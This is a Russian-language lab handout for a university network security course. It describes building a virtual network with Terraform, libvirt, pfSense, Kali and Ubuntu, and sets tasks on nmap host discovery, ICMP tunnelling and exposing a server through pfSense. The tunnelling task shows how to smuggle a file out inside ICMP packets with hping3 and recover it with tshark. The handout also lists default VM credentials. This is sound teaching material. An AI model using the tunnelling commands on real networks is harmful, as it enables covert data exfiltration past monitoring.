# Лабораторная 1: Сетевая безопасность (Cloud and Network Security)

**Ответственный/контактное лицо:** Asad Hasan, Juuso Herajärvi

---

## Предупреждение о ресурсах

> [!CAUTION]
> Эта платформа требует значительных ресурсов от вашей машины! Если у вас старый компьютер с 8 ГБ RAM или меньше, платформа, скорее всего, не будет работать оптимально.

Варианты решений:
1. Работа в группе
2. Посещение лаборатории и использование компьютеров университета
3. Использование легковесной VM (подробнее см. [lightweightVM_instead_of_kali.md](misc/lightweightVM_instead_of_kali.md))

---

## Подготовка и предварительные требования

* Создайте аккаунт GitHub (если еще нет)
* Создайте репозиторий ответов по [ссылке в Moodle](https://moodle.oulu.fi/course/view.php?id=18795)
* Установите необходимые программы (см. Задание 1)

### Windows пользователи

**Для Windows рекомендуется VirtualBox вместо VMware Workstation:**

* 📖 Подробная инструкция в [README_WINDOWS.md](README_WINDOWS.md)
* 📦 Включает: `install_virtualbox.ps1`, `setup_network_virtualbox.ps1`
* 🔧 Требуется менеджер пакетов Chocolatey

**Альтернативы:**
* **WSL2 + Ubuntu** — Лучшая совместимость с оригинальными инструкциями
* **VMware Workstation** — Ручная настройка ВМ
* **Lightweight Xubuntu** — 4.7 ГБ альтернатива для слабых систем

> [!NOTE]
> Требуется минимум 8 ГБ RAM. Для старых машин используйте Xubuntu или работайте в группе.

---

## Необходимые инструменты

* **hping3** — [Документация](https://www.kali.org/tools/hping3/)
* **nmap** — [Документация](https://nmap.org/book/man-host-discovery.html)
* **terraform** — [Учебник](https://k21academy.com/terraform-iac/terraform-beginners-guide/)
* **ICMP** — [Википедия](https://ru.wikipedia.org/wiki/ICMP)
* **pfSense** — [Официальная документация](https://docs.netgate.com/pfsense/en/latest/install/assign-interfaces.html)
* **Wireshark** — [Документация](https://www.wireshark.org/docs/wsug_html/)
* **virsh** — [Команды](https://download.libvirt.org/virshcmdref/html-single/)

---

## Оценка

| Задание | Баллы | Описание | Инструменты |
|---------|:-----:|----------|-------------|
| Задание 1 | 1 | Установка и настройка сети | Terraform, libvirt, QEMU, KVM |
| Задание 2 | 1 | Запуск виртуальной сети | pfSense, Terraform, Virtual Manager |
| Задание 3 | 1 | Обнаружение хостов в LAN | Nmap |
| Задание 4 | 1 | ICMP туннелирование | hping3, Wireshark, tshark |
| Задание 5 | 1 | Доступ к HTTP-серверу извне LAN | Произвольное решение |

Итоговая оценка зависит от суммы баллов. Максимум — 5 баллов.

---

## О лабораторной

* Это документ содержит описания заданий и теорию для лабораторной по сетевой безопасности.
* **Рекомендуется использовать свой компьютер или виртуальную машину.** Подробнее см. в Задании 1.

---

## Обзор сети

Сеть состоит из двух частей:
1. **WAN** — внешняя сеть
2. **LAN** — внутренняя сеть с:
   - Kali Linux (машина атаки)
   - Ubuntu Server (сервер)
   - pfSense (маршрутизатор + брандмауэр)

![Network diagram](https://github.com/ouspg/CloudAndNetworkSecurity/assets/113350302/58f7f99a-a9ac-4f80-9e67-653a677156fb)

---

## Задание 1: Установка

### Установка зависимостей

**Для Ubuntu/Debian:**
```bash
sudo apt update
sudo apt-get install qemu-kvm libvirt-daemon-system virt-top libguestfs-tools ovmf
sudo adduser $USER libvirt
sudo usermod -aG libvirt $(whoami)

sudo systemctl start libvirtd
sudo systemctl enable libvirtd
```

**Для Arch Linux:** см. [arch_installation_guide.md](misc/arch_installation_guide.md)

### Установка Terraform

Инструкции: https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli

**Проверка:**
```bash
which terraform
terraform --version
```

### Установка virt-manager и QEMU

```bash
sudo apt-get install virt-manager virt-install virt-viewer
```

### Скачивание образов ВМ

| Образ | Размер | Ссылка загрузки |
|-------|--------|-----------------|
| **Kali Linux 2026.1** | ~5 ГБ | [Download](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-qemu-amd64.7z) |
| **Xubuntu (легковесная)** | 4.7 ГБ | [Download](https://a3s.fi/swift/v1/CloudAndNetworkSecurity/Xubuntu.qcow2.tar.gz) *для слабых систем* |
| **Ubuntu Server 26.04 LTS** | 5.9 ГБ | [Download](https://ubuntu.com/download/server/thank-you?version=26.04&architecture=amd64&lts=true) |
| **pfSense 2.8.1** | ~1.2 ГБ | [Download](https://download.pfsense.org/releases/2.8.1/pfSense-CE-2.8.1-RELEASE-amd64.iso.gz) *(если недоступно, загрузите с [официального сайта](https://www.pfsense.org/download))*

Raspberry Pi images available at: https://www.kali.org/docs/arm/
```bash
git clone https://github.com/ouspg/network_sec_platform.git
```

Скопируйте образы в каталог: `network_sec_platform/images/`

### Установка дополнительных инструментов

```bash
sudo apt-get install -y mkisofs xsltproc
```

### Инициализация хранилища

```bash
cd network_sec_platform
sudo virsh pool-define /dev/stdin <<EOF
<pool type='dir'>
  <name>default_pool</name>
  <target>
    <path>$PWD/volumes</path>
  </target>
</pool>
EOF

sudo virsh pool-start default_pool
sudo virsh pool-autostart default_pool
sudo chown -R $(whoami):libvirt $PWD/volumes
```

### Настройка libvirt

Редактируйте `/etc/libvirt/qemu.conf`:
```conf
user = "<username>"
group = "libvirt"
security_driver = "none"
```

Restart:
```bash
sudo systemctl restart libvirtd
```

### Запуск сети через Terraform

```bash
export TERRAFORM_LIBVIRT_TEST_DOMAIN_TYPE="qemu"
terraform init
terraform apply
```

---

## Задание 2: Запуск сети

### A) Деплой через Terraform

```bash
git clone https://github.com/ouspg/network_sec_platform.git
cd network_sec_platform

terraform init
terraform validate
terraform apply
terraform destroy    # при завершении работы
```

### B) Доступ через Virtual Manager

```bash
virt-manager
```

Учётные данные:
- **Kali Linux:** kali:kali
- **Ubuntu Server:** ubuntu:linux
- **pfSense (веб-интерфейс):** admin:pfsense

### C) Настройка сети pfSense

После настройки LAN в pfSense CLI:
- IP: 10.0.0.1/24
- DHCP: 10.0.0.11–10.0.0.100

Перезагрузите Kali для применения изменений.

---

## Задание 3: Обнаружение хостов

Используйте nmap для поиска хостов в сети 10.0.0.0/24:

```bash
nmap -sn 10.0.0.0/24
```

---

## Задание 4: ICMP туннелирование

Передача данных через измененные ICMP-пакеты:

1. На сервере (Ubuntu) отправьте файл через hping3:
```bash
hping3 --icmp --file hackers_data.txt <kali_ip>
```

2. На Kali перехватите пакеты через Wireshark/tshark:
```bash
tshark -i eth0 icmp
```

3. Извлеките данные из pcap-файла:
```bash
tshark -r hacker_data.pcap -T fields -e data.data > hexdump.txt
```

---

## Задание 5: Доступ к серверу извне LAN

Настройте pfSense для доступа к HTTP-серверу из внешней сети:
- Порт форвардинг
- Правила брандмауэра
- VPN (OpenVPN)

---

## Устранение неполадок

См. документы:
- [diagnostic_guide.md](misc/diagnostic_guide.md) — Управление ресурсами через virsh
- [lightweightVM_instead_of_kali.md](misc/lightweightVM_instead_of_kali.md) — Использование Xubuntu

---

## Ссылки для скачивания образов (актуальные)

| Образ | Размер | Ссылка |
|-------|--------|--------|
| **Kali Linux 2026.1** | ~5 ГБ | [Download](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-qemu-amd64.7z) |
| **Xubuntu (легковесная)** | 4.7 ГБ | [Download](https://a3s.fi/swift/v1/CloudAndNetworkSecurity/Xubuntu.qcow2.tar.gz) |
| **Ubuntu Server 26.04 LTS** | 5.9 ГБ | [Download](https://ubuntu.com/download/server/thank-you?version=26.04&architecture=amd64&lts=true) |
| **pfSense 2.8.1** | ~1.2 ГБ | [Download](https://download.pfsense.org/releases/2.8.1/pfSense-CE-2.8.1-RELEASE-amd64.iso.gz) |

---

**Последнее обновление:** 2026-06-16
